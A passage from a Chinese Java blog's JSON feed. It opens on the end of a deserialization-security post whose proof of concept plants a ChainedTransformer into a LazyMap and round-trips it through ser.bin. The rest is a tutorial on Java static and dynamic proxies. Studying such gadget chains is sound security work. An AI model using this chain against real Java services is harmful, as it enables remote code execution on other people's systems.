punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        factory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        factory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span>chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>map1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> o<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> objectOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> objectInputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> objectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/20/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/",
            "url": "http://zhyzhyzhy.cn/2022/10/20/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/",
            "title": "Java 动态代理",
            "date_published": "2022-10-19T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>Java 中两种常见的动态代理方式：JDK 原生动态代理和 CGLIB 动态代理。本文只讲解 JDK 原生动态代理</p>\n</blockquote>\n<p>由于 Java 动态代理与 java 反射机制关系紧密，请确保已经了解了 Java 反射机制，可参考上一篇文章 <a href=\"https://zhyzhyzhy.cn/2022/10/19/Java%E5%8F%8D%E5%B0%84/\">《Java 反射》</a></p>\n<h1 id=\"代理模式\"><a class=\"anchor\" href=\"#代理模式\">#</a> 代理模式</h1>\n<p>为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。</p>\n<p>其实就是代理类为被代理类预处理消息、过滤消息并在此之后将消息转发给被代理类，之后还能进行消息的后置处理。代理类和被代理类通常会存在关联关系 (即上面提到的持有的被带离对象的引用)，代理类本身不实现服务，而是通过调用被代理类中的方法来提供服务。</p>\n<h1 id=\"静态代理\"><a class=\"anchor\" href=\"#静态代理\">#</a> 静态代理</h1>\n<p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p>\n<blockquote>\n<p>接口</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">IUser</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>被代理类</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">User</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"User show!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>代理类</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">IUser</span> user<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UserProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IUser</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>user <span class=\"token operator\">=</span> user<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello UserProxy!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>测试类</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">UserProxy</span> userProxy <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UserProxy</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        userProxy<span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>输出：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">Hello</span> <span class=\"token class-name\">UserProxy</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">User</span> show<span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span></pre></td></tr></table></figure><h2 id=\"静态代理的缺点\"><a class=\"anchor\" href=\"#静态代理的缺点\">#</a> 静态代理的缺点</h2>\n<p>使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也暴露了出来：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。</p>\n<h2 id=\"如何改进\"><a class=\"anchor\" href=\"#如何改进\">#</a> 如何改进</h2>\n<p>当然是让代理类动态的生成啦，也就是动态代理。<br />\n为什么类可以动态的生成？这就涉及到 Java 虚拟机的类加载机制了，可查看 <a href=\"https://zhyzhyzhy.cn/2022/10/20/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/\">类的加载机制</a></p>\n<h1 id=\"动态代理\"><a class=\"anchor\" href=\"#动态代理\">#</a> 动态代理</h1>\n<h2 id=\"动态代理-2\"><a class=\"anchor\" href=\"#动态代理-2\">#</a> 动态代理</h2>\n<p>代理类在程序运行时创建的代理方式被成为动态代理。 我们上面静态代理的例子中，代理类 (UserProxy) 是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在 Java 代码中定义的，而是在运行时根据我们在 Java 代码中的 “指示” 动态生成的。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。比如说，想要在每个代理的方法前都加上一个输出日志。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token comment\">// 调用被代理方法前加入输出</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我调用了 show\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里只有一个 show 方法，就写一次 beforeMethod 方法，但是如果除了 show 还有很多其他的方法，那就需要写很多次 beforeMethod 方法，麻烦。那看看下面动态代理如何实现。</p>\n<h2 id=\"动态代理简单实现\"><a class=\"anchor\" href=\"#动态代理简单实现\">#</a> 动态代理简单实现</h2>\n<p>在 java 的 java.lang.reflect 包下提供了一个 Proxy 类和一个 InvocationHandler 接口，通过这个类和这个接口可以生成 JDK 动态代理类和动态代理对象。<br />\n创建一个动态代理对象步骤，具体代码见后面：</p>\n<ul>\n<li>创建一个 InvocationHandler 对象</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 创建一个与代理对象相关联的 InvocationHandler</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserHandlerProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">InvocationHandler</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">IUser</span> user<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 接受被代理对象</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UserHandlerProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IUser</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>user <span class=\"token operator\">=</span> user<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 重写 invoke 方法</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> proxy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Method</span> method<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我调用了 \"</span> <span class=\"token operator\">+</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>Proxy 进行代理</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 使用 newProxyInstance 方法 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 参数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 第一个是 被代理类的 ClassLoader</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 第二个是 被代理类的 Class...&lt;?> Interfaces</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 第三个就是一个能接受被代理类的一个 InvocationHandler</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">IUser</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IUser</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> userHandlerProxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"动态代理底层实现\"><a class=\"anchor\" href=\"#动态代理底层实现\">#</a> 动态代理底层实现</h1>\n<p>动态代理具体步骤：</p>\n<ol>\n<li>通过实现 InvocationHandler 接口创建自己的调用处理器；</li>\n<li>通过为 Proxy 类指定 ClassLoader 对象和一组 interface 来创建动态代理类；</li>\n<li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li>\n<li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li>\n</ol>\n<p>既然生成代理对象是用的 Proxy 类的静态方 newProxyInstance，那么我们就去它的源码里看一下它到底都做了些什么？</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> loader<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                          <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                                          <span class=\"token class-name\">InvocationHandler</span> h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IllegalArgumentException</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Objects</span><span class=\"token punctuation\">.</span><span class=\"token function\">requireNonNull</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> intfs <span class=\"token operator\">=</span> interfaces<span class=\"token punctuation\">.</span><span class=\"token function\">clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">final</span> <span class=\"token class-name\">SecurityManager</span> sm <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSecurityManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sm <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token function\">checkProxyAccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Reflection</span><span class=\"token punctuation\">.</span><span class=\"token function\">getCallerClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> loader<span class=\"token punctuation\">,</span> intfs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>         <span class=\"token comment\">// 生成代理类对象</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> cl <span class=\"token operator\">=</span> <span class=\"token function\">getProxyClass0</span><span class=\"token punctuation\">(</span>loader<span class=\"token punctuation\">,</span> intfs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 使用指定的调用处理程序获取代理类的构造函数对象</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sm <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token function\">checkNewProxyPermission</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Reflection</span><span class=\"token punctuation\">.</span><span class=\"token function\">getCallerClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> cons <span class=\"token operator\">=</span> cl<span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span>constructorParams<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">InvocationHandler</span> ih <span class=\"token operator\">=</span> h<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token comment\">// 如果 Class 作用域为私有，通过 setAccessible 支持访问</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isPublic</span><span class=\"token punctuation\">(</span>cl<span class=\"token punctuation\">.</span><span class=\"token function\">getModifiers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token class-name\">AccessController</span><span class=\"token punctuation\">.</span><span class=\"token function\">doPrivileged</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PrivilegedAction</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Void</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                        cons<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token comment\">// 获取 Proxy Class 构造函数，创建 Proxy 代理实例。</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">return</span> cons<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>h<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalAccessException</span><span class=\"token operator\">|</span><span class=\"token class-name\">InstantiationException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token 